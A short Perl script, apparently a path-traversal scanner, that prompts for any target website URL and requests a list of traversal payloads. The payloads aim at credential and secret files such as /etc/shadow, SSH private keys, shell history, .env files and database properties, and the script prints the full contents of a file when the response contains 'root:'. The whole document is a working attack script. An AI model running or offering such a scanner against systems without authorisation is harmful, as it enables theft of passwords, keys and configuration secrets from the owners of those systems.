#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use Term::ANSIColor;

# Function to test for Path Traversal vulnerability
sub test_path_traversal {
    my ($url) = @_;

    my $ua = LWP::UserAgent->new;
    my @payloads = (
        '/etc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/resolv.conf',
        '/etc/crontab',
        '/../.htpasswd',
        '/../.bashrc',
        '/../.bash_history',
        '/../.ssh/id_rsa',
        '/../.ssh/authorized_keys',
        '/../../Windows/win.ini',
        '/../../Windows/System32/drivers/etc/hosts',
        '/../../boot.ini',
        '/../../autoexec.bat',
        '/../.env',
        '/../.git/config',
        '/../WEB-INF/web.xml',
        '/../WEB-INF/database.properties',
    );
    my $vulnerable = 0;

    foreach my $payload (@payloads) {
        my $response = $ua->get("$url$payload");

        if ($response->is_success) {
            my $content = $response->decoded_content;
            if ($content =~ /root:x:/i || $content =~ /root:/i || $content =~ /root:x:0:0:/i) {
                $vulnerable = 1;
                print color('red'), "Target is vulnerable to Path Traversal!\n", color('reset');
                print "Accessed file: $url$payload\n";
                print "Response content:\n";
                print "$content\n";
                last;
            }
        }
    }

    if (!$vulnerable) {
        print color('green'), "Target is not vulnerable to Path Traversal.\n", color('reset');
    }
}

# Main program
sub main {
    print "Enter your target website URL: ";
    my $target_url = <STDIN>;
    chomp $target_url;

    print "Testing for Path Traversal vulnerability on $target_url...\n";
    test_path_traversal($target_url);
}

main();
